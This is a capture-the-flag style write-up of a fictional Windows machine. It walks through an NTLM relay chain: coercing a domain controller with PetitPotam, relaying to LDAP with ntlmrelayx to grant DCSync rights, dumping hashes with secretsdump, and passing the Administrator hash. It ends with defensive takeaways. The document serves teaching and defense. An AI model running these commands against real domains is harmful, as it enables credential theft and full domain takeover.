> **Disclaimer:** Relay is a fictional machine written purely as an example.

## Overview

Relay is an Active Directory box that hammers on one theme: NTLM relaying. We
coerce a privileged machine account to authenticate to us, relay that
authentication to LDAP, and grant our own account DCSync rights.

| | |
|----------------|----------------------------|
| **Difficulty** | Hard                       |
| **OS**         | Windows Server 2022        |
| **Theme**      | Coercion + NTLM relay      |
| **Goal**       | DCSync → Domain Admin      |

## Recon

The domain controller exposes the usual AD surface — SMB, LDAP, Kerberos. SMB
signing is **not enforced** on the target we care about, which is the green
light for relaying.

```bash
nxc smb 10.10.11.77 -u guest -p '' --gen-relay-list targets.txt
```

## Coercion

With LDAP relaying set up via `ntlmrelayx`, we trigger the DC to authenticate
to us using PetitPotam:

```bash
impacket-ntlmrelayx -t ldap://10.10.11.77 --escalate-user svc_relay -smb2support
python3 PetitPotam.py 10.10.14.5 10.10.11.77
```

`ntlmrelayx` relays the incoming machine-account auth to LDAP and grants
`svc_relay` replication rights.

## DCSync

With replication rights in hand, dump the krbtgt and Administrator hashes:

```bash
impacket-secretsdump -just-dc 'corp.local/svc_relay@10.10.11.77'
```

Pass the Administrator hash for a SYSTEM shell and both flags.

## Takeaways

- **Enforce SMB signing** everywhere — it is the single control that kills this
  whole chain.
- **Patch the coercion vectors** (PetitPotam, PrinterBug) and disable unused RPC
  interfaces.
- **Monitor for DCSync** from non-DC accounts; it is a high-fidelity alert.
